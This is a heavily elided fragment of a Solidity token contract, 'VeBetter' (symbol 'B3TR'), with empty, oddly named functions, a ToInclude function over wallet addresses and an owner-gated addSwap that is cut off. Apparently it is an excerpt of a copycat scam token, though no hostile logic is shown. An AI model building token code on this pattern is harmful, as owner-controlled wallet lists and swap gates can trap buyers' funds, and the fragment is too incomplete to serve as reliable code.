...
contract VeBetter is Ownable {
    ...
    string private _name = "VeBetterDAO";
    string private _symbol = "B3TR";
    ...
    function ownerreturn() public {
    }
    function fromowner() external {
    }
    function memotyfrom() public {
    }
    function internalview() public {
    }
    function ToInclude(address[] calldata walletAddress) external {
    ...
    function addSwap(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
